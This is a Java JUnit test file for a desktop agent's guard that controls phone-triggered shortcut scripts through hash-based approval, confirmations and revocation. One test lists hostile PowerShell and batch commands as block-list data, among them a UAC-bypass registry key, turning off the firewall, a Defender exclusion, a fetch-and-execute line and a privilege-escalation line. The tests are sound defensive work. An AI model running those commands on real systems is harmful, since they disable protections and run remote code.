package com.onesay.desktop;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.atomic.AtomicInteger;

import org.junit.Test;

/**
 * link-v2 · 电脑上用户自己定义的快捷指令（{@link LinkPolicy.Cat#SHORTCUT}）：按「文件名 id + 内容哈希」批准；第一次 / 改过要在电脑上问（可选以后直接执行）；
 * 批准过的自动 / 完全访问直接执行、只读拒绝；内容碰严格规则的不能批准；撤销；端到端（手机→电脑局域网）。
 */
public class ShortcutGuardTest {

    static final LinkPolicy.Verdict A = LinkPolicy.Verdict.ALLOW, C = LinkPolicy.Verdict.CONFIRM, D = LinkPolicy.Verdict.DENY;

    /** 记下每次问了什么、有没有给「以后直接执行」。 */
    static final class Stub implements PcGuard.Confirmer {
        int answer = PcGuard.TIMEOUT;
        final List<String> asked = new ArrayList<>();
        final List<Boolean> offered = new ArrayList<>();

        @Override public int ask(String from, String cmd, String detail, long timeoutMs) {
            return ask(from, cmd, detail, timeoutMs, false);
        }

        @Override public int ask(String from, String cmd, String detail, long timeoutMs, boolean offerAlways) {
            assertEquals(PcGuard.CONFIRM_MS, timeoutMs); // [approve-not-block] 30 秒 → 60 秒（方案 4）
            asked.add(cmd + "|" + detail);
            offered.add(offerAlways);
            return answer;
        }
    }

    static Config cfg(String level) throws Exception {
        Config c = PcGuardTest.cfg(level);
        c.scriptsDir = Files.createTempDirectory("pcsc").toString();
        return c;
    }

    static Map<String, Object> m(Object... kv) { return PcGuardTest.m(kv); }

    static String reason(PcGuard.Outcome o) { return PcGuardTest.reason(o); }

    static Object data(PcGuard.Outcome o, String k) { return o.reply == null ? null : o.reply.data.get(k); }

    static Path write(Config c, String name, String body) throws Exception {
        Path p = Path.of(c.scriptsDir, name);
        Files.write(p, body.getBytes(StandardCharsets.UTF_8));
        return p;
    }

    static LinkPolicy.Facts facts(boolean listed, boolean approved, boolean changed, String blocked) {
        LinkPolicy.Facts f = new LinkPolicy.Facts();
        f.shortcutListed = listed;
        f.shortcutApproved = approved;
        f.shortcutChanged = changed;
        f.shortcutBlocked = blocked;
        return f;
    }

    // ------------------------------------------------------------------ 纯判定

    @Test public void shortcutPolicyMatrix() {
        Object[][] rows = {
                // 事实, 只读, 自动, 完全访问, 自动/完全访问下的原因码
                {facts(false, false, false, ""), D, D, D, LinkPolicy.R_UNKNOWN},
                {facts(true, false, false, ""), D, C, C, LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL},
                {facts(true, false, true, ""), D, C, C, LinkPolicy.R_SHORTCUT_CHANGED},
                {facts(true, true, false, ""), D, A, A, ""},
                {facts(true, false, false, "内容涉及注册表"), D, D, D, LinkPolicy.R_SHORTCUT_BLOCKED},
                {facts(true, true, false, "内容涉及注册表"), D, D, D, LinkPolicy.R_SHORTCUT_BLOCKED}, // 批准表里有也不放
                {facts(true, false, true, "内容涉及授予权限"), D, D, D, LinkPolicy.R_SHORTCUT_BLOCKED}};
        for (Object[] r : rows) {
            LinkPolicy.Facts f = (LinkPolicy.Facts) r[0];
            LinkPolicy.Decision ro = LinkPolicy.decide(LinkPolicy.Target.PC, LinkPolicy.Level.READ_ONLY, LinkPolicy.Cat.SHORTCUT, f);
            assertEquals(r[1], ro.verdict);
            assertEquals("只读一律按级别拒", LinkPolicy.R_DENIED_BY_LEVEL, ro.reason);
            for (int i = 0; i < 2; i++) {
                LinkPolicy.Level l = i == 0 ? LinkPolicy.Level.AUTO : LinkPolicy.Level.FULL;
                LinkPolicy.Decision d = LinkPolicy.decide(LinkPolicy.Target.PC, l, LinkPolicy.Cat.SHORTCUT, f);
                assertEquals(l + " " + r[4], r[2 + i], d.verdict);
                assertEquals(l + " " + r[4], r[4], d.reason);
            }
        }
        assertEquals(LinkPolicy.Cat.SHORTCUT, LinkPolicy.pcCat("shortcut_run"));
        assertEquals("工作区脚本还是 RUN_WS_SCRIPT", LinkPolicy.Cat.RUN_WS_SCRIPT, LinkPolicy.pcCat("script_run"));
        assertEquals("快捷指令列表本身是查询", LinkPolicy.Cat.QUERY, LinkPolicy.pcCat("shortcut_list"));
        assertEquals("手机端没有快捷指令这一类指令", LinkPolicy.Cat.UNKNOWN, LinkPolicy.phoneCat("shortcut_run"));
        // 不改动已有类别的矩阵：RUN_WS_SCRIPT 仍是 只读拒 / 自动拒 / 完全访问每次确认
        // [第二轮] 改：旧「自动」= 工作区可写·分类，跑工作区脚本从拒绝改成每次确认（用户决定 1）
        assertEquals(C, LinkPolicy.decide(LinkPolicy.Target.PC, LinkPolicy.Level.AUTO, LinkPolicy.Cat.RUN_WS_SCRIPT, null).verdict);
        assertEquals(C, LinkPolicy.decide(LinkPolicy.Target.PC, LinkPolicy.Level.FULL, LinkPolicy.Cat.RUN_WS_SCRIPT, null).verdict);
    }

    @Test public void factsHashAndApprovalTable() {
        byte[] body = "Start-Process notepad".getBytes(StandardCharsets.UTF_8);
        String h = LinkPolicy.sha256Hex(body);
        assertEquals(64, h.length());
        assertEquals("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", LinkPolicy.sha256Hex(new byte[0]));
        Map<String, String> ap = new TreeMap<>();
        LinkPolicy.Facts f = LinkPolicy.shortcutFacts("Notepad.ps1", body, ap, true);
        assertTrue(f.shortcutListed);
        assertFalse(f.shortcutApproved);
        assertFalse(f.shortcutChanged);
        assertEquals(h, f.shortcutHash);
        ap.put("notepad.ps1", h);
        assertTrue("id 不分大小写", LinkPolicy.shortcutFacts("NOTEPAD.PS1", body, ap, true).shortcutApproved);
        LinkPolicy.Facts ch = LinkPolicy.shortcutFacts("notepad.ps1", "Start-Process calc".getBytes(StandardCharsets.UTF_8), ap, true);
        assertFalse("内容改了 = 不再算批准", ch.shortcutApproved);
        assertTrue(ch.shortcutChanged);
        assertFalse("改名 = 新快捷指令", LinkPolicy.shortcutFacts("notepad2.ps1", body, ap, true).shortcutApproved);
        assertFalse("列表里没有", LinkPolicy.shortcutFacts("notepad.ps1", body, ap, false).shortcutListed);
        // 批准表存取：文件名里的 , = 中文都能来回；坏项丢掉
        Map<String, String> m = new java.util.LinkedHashMap<>();
        m.put("下班 模式,a=b.ps1", h);
        m.put("x.bat", LinkPolicy.sha256Hex(new byte[]{1}));
        String text = LinkPolicy.formatApprovals(m);
        assertEquals(m, LinkPolicy.parseApprovals(text));
        assertEquals(m, LinkPolicy.parseApprovals(text + ",bad=xyz,=" + h + ",noeq"));
        assertTrue(LinkPolicy.parseApprovals(null).isEmpty());
        assertEquals("x.ps1", LinkPolicy.shortcutId("C:\\Users\\me\\快捷\\X.ps1"));
    }

    @Test public void blockedBodiesCannotBeApproved() throws Exception {
        // [插件 / C] 改：HKCU 普通键（reg add HKCU\Software\X、Set-ItemProperty HKCU:\Software\X）和 HKCU 下的代理设置
        // 现在是普通用户能做的事，放行（移到下面的 ok 列表）；换成 HKCU 里能影响提权的键（B.3），这些仍不能批准
        String[] bad = {
                "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd.exe /f",
                "Set-ItemProperty -Path 'HKCU:\\Environment' -Name COR_PROFILER -Value x",
                "New-ItemProperty -Path HKLM:\\SOFTWARE\\X -Name a",
                "netsh advfirewall set allprofiles state off",
                "Set-DnsClientServerAddress -InterfaceAlias Wi-Fi -ServerAddresses 1.1.1.1",
                "Disable-NetAdapter -Name Ethernet -Confirm:$false",
                "notepad C:\\Windows\\System32\\drivers\\etc\\hosts",
                "Stop-Service wuauserv",
                "sc config wuauserv start= disabled",
                "icacls C:\\OneSay /grant Everyone:F",
                "Add-MpPreference -ExclusionPath C:\\",
                "net localgroup administrators me /add",
                "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                "$c=[Convert]::FromBase64String($x)",
                "iex (irm https://example.com/a.ps1)",
                "@echo off\r\nREM 改策略\r\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f\r\n",
                "Start-Process powershell -Verb RunAs"};
        for (String b : bad) assertFalse(b, LinkPolicy.shortcutBodyBlocked(b).isEmpty());
        // UTF-16（记事本存的）也看得出来
        // [插件 / C] 改：例子从 HKCU\X（现在放行）换成 HKLM\X（要管理员，仍拦）；UTF-16 识别本身没变
        byte[] u16 = ("\uFEFFreg add HKLM\\X /f").getBytes(StandardCharsets.UTF_16LE);
        assertTrue(LinkPolicy.decodeScript(u16).contains("reg add"));
        assertFalse(LinkPolicy.shortcutFacts("p.bat", u16, null, true).shortcutBlocked.isEmpty());
        byte[] u16nobom = "reg add HKLM\\X /f".getBytes(StandardCharsets.UTF_16LE);
        assertFalse(LinkPolicy.shortcutFacts("p.bat", u16nobom, null, true).shortcutBlocked.isEmpty());
        for (String ok : new String[]{"Start-Process notepad", "explorer.exe D:\\照片", "@echo off\r\nstart \"\" \"C:\\Program Files\\VS Code\\Code.exe\"\r\n",
                "Get-ChildItem $env:USERPROFILE\\Desktop | Remove-Item -WhatIf",
                // [C] 新：普通用户能做的事放行（HKCU 普通键 / HKCU 代理 / 注释里写到的词）
                "reg add HKCU\\Software\\X /v a /d 1 /f", "Set-ItemProperty -Path 'HKCU:\\Software\\X' -Name a -Value 1",
                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable -Value 1",
                "# 不要改 proxy / firewall，也不要 reg add HKLM\nStart-Process notepad", "<# netsh advfirewall 只是说明 #>\nStart-Process notepad"})
            assertEquals(ok, "", LinkPolicy.shortcutBodyBlocked(ok));

        // 守卫：完全访问 + 点了「以后直接执行」也不问、不批准、不执行，回带原因
        Config c = cfg("full");
        Stub st = new Stub();
        st.answer = PcGuard.ALWAYS;
        PcGuard g = new PcGuard(c, st);
        int i = 0;
        for (String b : bad) {
            String name = "bad" + (i++) + ".ps1";
            write(c, name, b);
            PcGuard.Outcome o = g.check("phone", "shortcut_run", m("name", name));
            assertEquals(b, LinkPolicy.R_SHORTCUT_BLOCKED, reason(o));
            assertTrue(o.reply.text, o.reply.text.contains("只能你在电脑上自己运行") && o.reply.text.contains("（"));
            assertFalse(o.reply.ok);
        }
        assertEquals("从没问过", 0, st.asked.size());
        assertTrue("没记进批准表", g.approvals().isEmpty());
        // 批准表里硬塞了它的哈希也不放
        Path p = write(c, "seeded.ps1", "reg delete HKLM\\X /f"); // [插件 / C] 改：HKCU → HKLM（HKCU 普通键现在放行）
        g.approve("seeded.ps1", LinkPolicy.sha256Hex(Files.readAllBytes(p)));
        assertEquals(LinkPolicy.R_SHORTCUT_BLOCKED, reason(g.check("phone", "shortcut_run", m("name", "seeded"))));
        // 界面：显示 blocked + 原因
        boolean seen = false;
        for (Object x : g.shortcutView()) {
            Map<?, ?> v = (Map<?, ?>) x;
            if ("seeded.ps1".equals(v.get("id"))) {
                seen = true;
                assertEquals("blocked", v.get("status"));
                assertTrue(String.valueOf(v.get("why")), String.valueOf(v.get("why")).contains("注册表"));
            }
        }
        assertTrue(seen);
        assertEquals("blocked", ((Map<?, ?>) g.approvalView().get(0)).get("status"));

        // 快捷指令文件夹在手机能写的工作区里：不算用户定义的，不能批准
        Config w = PcGuardTest.cfg("auto");
        Path inWs = Path.of(w.workspaceDir, "scripts");
        Files.createDirectories(inWs);
        w.scriptsDir = inWs.toString();
        Files.writeString(inWs.resolve("hi.ps1"), "Start-Process notepad");
        Stub s2 = new Stub();
        s2.answer = PcGuard.ALWAYS;
        PcGuard g2 = new PcGuard(w, s2);
        PcGuard.Outcome o = g2.check("phone", "shortcut_run", m("name", "hi"));
        assertEquals(LinkPolicy.R_SHORTCUT_BLOCKED, reason(o));
        assertTrue(o.reply.text, o.reply.text.contains("工作区"));
        assertEquals(0, s2.asked.size());
    }

    // ------------------------------------------------------------------ 守卫流程

    @Test public void approveOnceAlwaysHashResetAndRevoke() throws Exception {
        Config c = cfg("auto");
        Stub st = new Stub();
        PcGuard g = new PcGuard(c, st);
        Path p = write(c, "下班模式.ps1", "Start-Process notepad\n");

        // 第一次：问，并给「以后直接执行」；没人点 = 不执行，原因码 shortcut_needs_approval + confirm_result
        PcGuard.Outcome o = g.check("phone", "shortcut_run", m("name", "下班模式"));
        assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, reason(o));
        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, data(o, "confirm_result"));
        assertEquals("下班模式.ps1", data(o, "shortcut"));
        assertEquals("这个快捷指令还没在电脑上批准", data(o, "reason_zh"));
        assertEquals(1, st.asked.size());
        assertTrue(st.offered.get(0));
        assertTrue(st.asked.get(0), st.asked.get(0).startsWith("shortcut_run|phone 请求：运行快捷指令「下班模式」"));
        assertEquals("new", ((Map<?, ?>) g.shortcutView().get(0)).get("status"));

        st.answer = PcGuard.DENY;
        o = g.check("phone", "shortcut_run", m("name", "下班模式.ps1"));
        assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, reason(o));
        assertEquals(LinkPolicy.R_CONFIRM_DENIED, data(o, "confirm_result"));

        // 允许一次：这次执行（带内容哈希给执行端核对），但不记批准，下次还问
        st.answer = PcGuard.ALLOW;
        o = g.check("phone", "shortcut_run", m("name", "下班模式"));
        assertNull(o.reply);
        assertEquals(LinkPolicy.sha256Hex(Files.readAllBytes(p)), o.args.get("_sha256"));
        assertTrue(g.approvals().isEmpty());
        assertNull(g.check("phone", "shortcut_run", m("name", "下班模式")).reply);
        assertEquals(4, st.asked.size());

        // 手机不能自己塞哈希 / 批准（_ 开头的参数会被丢掉，再按文件现算）
        st.answer = PcGuard.TIMEOUT;
        o = g.check("phone", "shortcut_run", m("name", "下班模式", "_sha256", "00", "_approved", true));
        assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, reason(o));

        // 以后直接执行：记批准（存进配置文件），之后自动 / 完全访问都不再问
        st.answer = PcGuard.ALWAYS;
        assertNull(g.check("phone", "shortcut_run", m("name", "下班模式")).reply);
        assertEquals(LinkPolicy.sha256Hex(Files.readAllBytes(p)), g.approvals().get("下班模式.ps1"));
        assertEquals(g.approvals(), LinkPolicy.parseApprovals(Config.load(c.file).shortcutApprovals));
        int n = st.asked.size();
        st.answer = PcGuard.DENY;
        assertNull(g.check("phone", "shortcut_run", m("name", "下班模式")).reply);
        c.pcLevel = "full";
        assertNull(g.check("phone", "shortcut_run", m("name", "下班模式.ps1")).reply);
        assertEquals("批准过的不再问", n, st.asked.size());
        assertEquals("approved", ((Map<?, ?>) g.shortcutView().get(0)).get("status"));
        assertEquals("approved", ((Map<?, ?>) g.approvalView().get(0)).get("status"));

        // 只读：批准过也拒，不问
        c.pcLevel = "read_only";
        assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, reason(g.check("phone", "shortcut_run", m("name", "下班模式"))));
        assertEquals(n, st.asked.size());
        c.pcLevel = "auto";

        // 改了内容 → 哈希对不上 → shortcut_changed，重新问
        Files.writeString(p, "Start-Process calc\n");
        st.answer = PcGuard.TIMEOUT;
        o = g.check("phone", "shortcut_run", m("name", "下班模式"));
        assertEquals(LinkPolicy.R_SHORTCUT_CHANGED, reason(o));
        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, data(o, "confirm_result"));
        assertTrue(st.asked.get(st.asked.size() - 1), st.asked.get(st.asked.size() - 1).contains("内容改过"));
        assertEquals("changed", ((Map<?, ?>) g.shortcutView().get(0)).get("status"));
        assertEquals("changed", ((Map<?, ?>) g.approvalView().get(0)).get("status"));
        st.answer = PcGuard.ALLOW;
        assertNull("允许一次不更新批准", g.check("phone", "shortcut_run", m("name", "下班模式")).reply);
        st.answer = PcGuard.TIMEOUT;
        assertEquals(LinkPolicy.R_SHORTCUT_CHANGED, reason(g.check("phone", "shortcut_run", m("name", "下班模式"))));
        st.answer = PcGuard.ALWAYS;
        assertNull(g.check("phone", "shortcut_run", m("name", "下班模式")).reply);
        assertEquals(LinkPolicy.sha256Hex(Files.readAllBytes(p)), g.approvals().get("下班模式.ps1"));
        n = st.asked.size();
        assertNull(g.check("phone", "shortcut_run", m("name", "下班模式")).reply);
        assertEquals(n, st.asked.size());

        // 改名 = 新快捷指令
        Files.copy(p, Path.of(c.scriptsDir, "下班模式2.ps1"));
        st.answer = PcGuard.TIMEOUT;
        assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, reason(g.check("phone", "shortcut_run", m("name", "下班模式2"))));

        // 撤销：之后又要问；没有的撤销返回 false
        assertFalse(g.revoke("nope.ps1"));
        assertTrue(g.revoke("下班模式.PS1"));
        assertTrue(g.approvals().isEmpty());
        assertTrue(LinkPolicy.parseApprovals(Config.load(c.file).shortcutApprovals).isEmpty());
        assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, reason(g.check("phone", "shortcut_run", m("name", "下班模式"))));

        // 文件删了：批准表里显示 missing，触发 = 列表里没有
        st.answer = PcGuard.ALWAYS;
        assertNull(g.check("phone", "shortcut_run", m("name", "下班模式")).reply);
        Files.delete(p);
        assertEquals("missing", ((Map<?, ?>) g.approvalView().get(0)).get("status"));
        assertEquals(LinkPolicy.R_UNKNOWN, reason(g.check("phone", "shortcut_run", m("name", "下班模式"))));
        // 不在快捷指令文件夹里的路径一律不认
        for (String bad : new String[]{"../x", "..\\x.ps1", "C:\\Windows\\x.ps1", "sub/x.ps1", ""})
            assertEquals(bad, LinkPolicy.R_UNKNOWN, reason(g.check("phone", "shortcut_run", m("name", bad))));
    }

    @Test public void executorRechecksHashBeforeRunning() throws Exception {
        Config c = cfg("auto");
        write(c, "a.ps1", "Start-Process notepad");
        DesktopActions d = new DesktopActions(c);
        Actions.Result r = d.run("shortcut_run", m("name", "a", "_sha256", LinkPolicy.sha256Hex("Start-Process calc".getBytes(StandardCharsets.UTF_8))));
        assertFalse(r.ok);
        assertTrue(r.text, r.text.contains("内容刚改过"));
        assertFalse(d.run("shortcut_run", m("name", "nope", "_sha256", "x")).ok);
    }

    @Test public void confirmsAlwaysOnlyWhenOffered() throws Exception {
        PcGuard.Confirms cf = new PcGuard.Confirms();
        for (boolean offer : new boolean[]{true, false}) {
            Thread t = new Thread(() -> {
                for (int i = 0; i < 200 && cf.list().isEmpty(); i++) try { Thread.sleep(10); } catch (InterruptedException ignored) { }
                Map<?, ?> x = (Map<?, ?>) cf.list().get(0);
                assertEquals(offer, x.get("always"));
                ApprovalGuardTest.click(cf, ((Number) x.get("id")).intValue(), true, true); // [确认框防误点] 改：显示 + 等 0.7 秒后再点
            });
            t.start();
            assertEquals(offer ? PcGuard.ALWAYS : PcGuard.ALLOW, cf.ask("phone", "shortcut_run", "运行快捷指令", 5000, offer));
            t.join();
        }
        // 拒绝时 always 不起作用
        Thread t = new Thread(() -> {
            for (int i = 0; i < 200 && cf.list().isEmpty(); i++) try { Thread.sleep(10); } catch (InterruptedException ignored) { }
            cf.resolve(((Number) ((Map<?, ?>) cf.list().get(0)).get("id")).intValue(), false, true);
        });
        t.start();
        assertEquals(PcGuard.DENY, cf.ask("phone", "shortcut_run", "运行快捷指令", 5000, true));
        t.join();
        assertEquals(PcGuard.TIMEOUT, cf.ask("phone", "shortcut_run", "x", 100, true));
    }

    // ------------------------------------------------------------------ 端到端

    /** 手机（另一端）经局域网触发快捷指令：第一次电脑上点「以后直接执行」→ 执行；再触发不问直接执行；改内容后拒绝 → shortcut_changed。 */
    @Test public void endToEndApprovalOverLan() throws Exception {
        int port = LanTest.freePortPair();
        Config pcCfg = LanTest.pc(port);
        pcCfg.workspaceDir = Files.createTempDirectory("pcws-sc").toFile().getCanonicalPath();
        pcCfg.scriptsDir = Files.createTempDirectory("pcsc-e2e").toString();
        Path sc = Path.of(pcCfg.scriptsDir, "备份照片.bat");
        Files.writeString(sc, "@echo off\r\nrobocopy D:\\照片 E:\\备份 /E\r\n");
        StringBuilder log = new StringBuilder();
        List<String> ran = new java.util.concurrent.CopyOnWriteArrayList<>();
        Actions acts = new Actions() {
            final Main.TestActions base = new Main.TestActions();
            @Override public List<String> capabilities() { return List.of("ping", "shortcut_list", "shortcut_run"); }
            @Override public Result run(String cmd, Map<String, Object> a) throws Exception {
                if (cmd.equals("shortcut_run")) {
                    ran.add(a.get("name") + "|" + a.get("_sha256"));
                    return Result.ok("正在执行快捷指令");
                }
                return base.run(cmd, a);
            }
        };
        Agent agent = new Agent(pcCfg, acts, s -> { synchronized (log) { log.append(s).append('\n'); } });
        AtomicInteger mode = new AtomicInteger(2); // 2 = 以后直接执行，0 = 拒绝
        AtomicInteger prompts = new AtomicInteger();
        agent.confirms.onNew = d -> {
            prompts.incrementAndGet();
            new Thread(() -> {
                for (int i = 0; i < 200 && agent.confirms.list().isEmpty(); i++) try { Thread.sleep(10); } catch (InterruptedException ignored) { }
                Map<?, ?> x = (Map<?, ?>) agent.confirms.list().get(0);
                ApprovalGuardTest.click(agent.confirms, ((Number) x.get("id")).intValue(), mode.get() != 0, mode.get() == 2); // [确认框防误点] 改：显示 + 等 0.7 秒后再点
            }).start();
        };
        agent.start();
        Thread.sleep(300);
        Path out = Files.createTempDirectory("e2e-sc");
        try {
            Config cli = LanTest.client(pcCfg, "127.0.0.1:" + port);
            assertEquals(0, Cli.send(cli, "pc-lan", "shortcut_run", m("name", "备份照片"), out, 10));
            assertEquals(1, prompts.get());
            assertEquals(1, ran.size());
            assertTrue(ran.get(0), ran.get(0).endsWith("|" + LinkPolicy.sha256Hex(Files.readAllBytes(sc))));
            assertNotNull(agent.guard.approvals().get("备份照片.bat"));
            assertEquals("批准过的直接执行", 0, Cli.send(cli, "pc-lan", "shortcut_run", m("name", "备份照片"), out, 10));
            assertEquals("不再问", 1, prompts.get());
            assertEquals(2, ran.size());

            Files.writeString(sc, "@echo off\r\nrobocopy D:\\照片 F:\\别处 /MIR\r\n");
            mode.set(0);
            assertEquals(1, Cli.send(cli, "pc-lan", "shortcut_run", m("name", "备份照片"), out, 10));
            assertEquals(2, prompts.get());
            assertEquals("改过的没执行", 2, ran.size());

            // [插件 / C] 改：HKCU 普通键现在放行；换成要管理员的内容（HKLM）测「碰规则的不问」
            Files.writeString(Path.of(pcCfg.scriptsDir, "代理.ps1"), "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\X' -Name ProxyEnable -Value 1");
            assertEquals(1, Cli.send(cli, "pc-lan", "shortcut_run", m("name", "代理"), out, 10));
            assertEquals("碰严格规则的不问", 2, prompts.get());
            String l = log.toString();
            assertTrue(l, l.contains(LinkPolicy.R_SHORTCUT_CHANGED));
            assertTrue(l, l.contains(LinkPolicy.R_SHORTCUT_BLOCKED));
        } finally {
            agent.stop();
        }
    }
}
